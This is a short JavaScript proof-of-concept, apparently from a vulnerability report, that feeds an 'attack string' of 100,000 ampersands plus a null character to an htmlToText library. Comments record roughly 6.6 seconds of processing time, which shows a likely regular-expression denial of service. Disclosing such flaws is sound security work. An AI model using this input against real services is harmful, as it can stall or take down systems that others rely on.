const htmlToText = require("./jsHtmlToText.js");

//Attack String :""+"&"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "&";
}
str += "\u0000";

var result = htmlToText(str, "");

// real    0m6.655s
// user    0m6.623s
// sys     0m0.010s
